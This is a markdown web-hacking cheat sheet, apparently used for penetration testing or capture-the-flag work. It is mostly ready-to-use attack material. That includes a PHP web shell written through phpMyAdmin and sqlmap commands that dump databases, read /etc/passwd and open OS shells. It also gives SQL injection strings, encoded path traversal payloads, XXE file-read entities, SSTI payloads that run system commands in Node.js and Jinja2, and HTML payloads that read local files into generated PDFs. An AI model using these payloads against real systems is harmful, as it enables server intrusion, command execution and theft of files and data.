<picture>
    <source height="100px" srcset="https://user-images.githubusercontent.com/22857002/173634310-3549c3ef-b20b-445f-bae2-554c026d734c.svg#gh-dark-mode-only" media="(prefers-color-scheme: dark)">
    <img height="100px" src="https://user-images.githubusercontent.com/28403617/172732613-4ce46b3f-916f-4053-9ebf-76906a2d8d6d.svg#gh-light-mode-only">
</picture>

---

- [BruteForce](#bruteforce)
- [CMS](#cms)
- [Certificate](#certificate)
- [Download .git](#download-git)
- [Dynamodb](#dynamodb)
- [Influx DB](#influx-db)
- [Interesting routes](#interesting-routes)
- [MySql](#mysql)
- [Path traversal](#path-traversal)
- [PhpMyAdmin](#phpmyadmin)
- [Request](#request)
- [SQL Injection](#sql-injection)
- [SSTI](#ssti)
- [XML external entity (XXE)](#xml-external-entity-xxe)
- [Server Side XSS](#server-side-xss)

# BruteForce
### Wordlist

| Name                      | Path                                                                    |
|:--------------------------|:------------------------------------------------------------------------|
| SecLists Raft Medium      | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |
| Dirbuster Small           | `/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt`           |
| Dirbuster Small Lowercase | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt` |
| Dirb                      | `/usr/share/dirb/wordlists/common.txt`                                  |

### Extensions

| Type    | Extension      |
|:--------|:---------------|
| Script  | `php,js,twig`  |
| Text    | `html,txt,md`  |
| Data    | `json,csv`     |
| DB      | `db,sqlite`    |
| Linux   | `sh,bin`       |
| Windows | `ps1,exe`      |

### ffuf
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/FUZZ'
```
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://url/ -H 'Host: FUZZ.host'
```

### Gobuster
```bash
gobuster dir -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 25 -x html,php
```

### Feroxbuster
```bash
feroxbuster -u <url> -e -x html,js,php
```

### Dirb
```bash
dirb url -R
```

### GUI
```bash
dirbuster
```
```bash
owasp-zap
```

# PhpMyAdmin
### Quick Shellcode
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```

# MySql
### Connect to mysql
```bash
mysql -h localhost -u myname -p
```
### Show Info
```
SHOW DATABASES;
use db_name
SHOW TABLES;
select * from table_name
```
### Open SQLite3
```bash
sqlite3 database.sqlite3
```
or open in vs code

# Influx DB

[CVE-2019-20933 Influxdb](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)

```
> show databases # to display databases
> show field keys # field keys (like columns in sql)
> show measurements # to display measurements (like tables in sql)
{
  ...
  "results": [
    "values": [
        [
            <strong>"foo"</strong>
        ]
    ]
  ...
}
> select * from "foo" # display all content of measurments (table) 'foo' (keep the doubles quotes)
```

# Dynamodb

See [this page](../wiki/Cloud.md)

# SQL Injection
## SQLmap

[SQLmap Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

### Discovery
```bash
sqlmap -r req
# If you know info
sqlmap -r req --os <os> --dbms <type db> --technique <tech>
```

- [List OS](https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-database-management-system-operating-system-name)
- [List DBMS](https://github.com/sqlmapproject/sqlmap/wiki/Usage#force-the-dbms)
- [List Techniques](https://github.com/sqlmapproject/sqlmap/wiki/Usage#sql-injection-techniques-to-test-for)

### Get DB
```bash
# List databases
sqlmap -r req --predict-output --dbs
# List Tables
sqlmap -r req --predict-output --tables -D db
# Dump Table
sqlmap -r req --predict-output --dump -D db -T table 
# Dump Column(s)
sqlmap -r req --predict-output --dump -D db -T table -C column
```

### List Privileges
```bash
sqlmap -r req --current-user
sqlmap -r req --privileges
sqlmap -r req --roles
```

### File
```bash
# Read file
sqlmap -r req --file-read=/etc/passwd
# Upload file
sqlmap -r req --file-write=/local/file --file-dest=/dest/path
```

### Shell
```bash
# Upload Reverse shell
sqlmap -r req --os-shell
sqlmap -r req --os-cmd 'echo desbarres'
# Sql Shell
sqlmap -r req --sql-shell
```

### Optimize
```
-o                  Turn on all optimization switches
--predict-output    Predict common queries output
--keep-alive        Use persistent HTTP(s) connections
--null-connection   Retrieve page length without actual HTTP response body
--threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

--time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
```

### Turbo SQLmap
```bash
sqlmap -u 'https://example.com/?arg=*' --dump -T table_example -D example_db --level=2 --force-ssl --time-sec 1 --predict-output --dbms 'MySQL' --technique T  --flush-session
```

## Manual
### Common pattern
```
" OR ""="
' OR ''='
' OR 1=1 -- comment
```

# Request
## Curl
### Send X-form
```bash
curl 'http://example.com/login' -H 'Content-Type: application/x-www-form-urlencoded' -sd 'username=login&password=pass'
```

### Send Json
```bash
curl -X POST https://example.com/api/submit -H "Content-Type: application/json" -sd '{"email":"lol@lol.com"}'
```

## Python
### Requests
```python
import requests

s = requests.session()
# s.proxies = {
#   "http": "localhost:8080",
#   "https": "localhost:8080",
# }

r = s.get('http://example.com')
print(r.text)
r = s.post('http://example.com/submit',
    headers={
        'Content-type': 'raw',
    },
    data={'user': 'guest'},
    # auth=('username', 'password')
)
print(r.status_code, r.url)
```

# Path traversal

[Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)

[File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

```
︰/︰/︰/︰/︰/︰/︰/︰/︰/etc/passwd
..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/..%252f/%252f/etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252e%252e%252e%252fetc%252fpasswd%00
```

# Download .git
```bash
githacker --url http://url/.git/ --folder result
```
[Source](https://github.com/WangYihang/GitHacker)

# XML external entity (XXE)
### Read File
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd" >
]>
<foo>Hello &file;</foo>
```
### Get Link
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "http://example.com/path">
]>
<foo>Hello &file;</foo>
```
```xml
<!DOCTYPE foo [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<foo>Hello &file;</foo>
```

# SSTI
[Github Websites Vulnerable To SSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

### Test
```
{{1+1}}
${1+1}
<%= 1+1 %>
${{1+1}}
#{1+1}
```

### Nunchucks (Nodejs)
```
{{range.constructor("console.log(123)")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

### Python (Jinja2)
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

### Golang
```
{{.}}
```

# CMS
### Scaning
```bash
wpscan --force update -e --url IP --disable-tls-checks
```

# Interesting routes
### Graphql

```
/graphql
/graphiql
/graphql.php
/graphql/console
```

# Certificate
```
curl <url> --key KEY.key --cert CERT.cert
```

# Server Side XSS

### Read local file (Dynamic PDF)

#### (Basic)

```
<iframe src=file:///etc/passwd></iframe>
<img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///etc/passwd">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id="portal">
<svg-dummy></svg-dummy><iframe src='file:///etc/passwd' width='100%' height='1000px'></iframe><svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>
```

#### (Advanced)

```
<annotation file="/etc/passwd" content="/etc/passwd" icon="graph" title="Attached File: /etc/passwd" pos-x="195" />
```

You can extract annotation files with this [script](https://github.com/sawyerf/HackSheet/scripts/get-pdf-annot.py):
```
pip install pymupdf
python script/get-pdf-annot.py -f "<HTTP(S)_URL> OR <PDF_PATH>"
```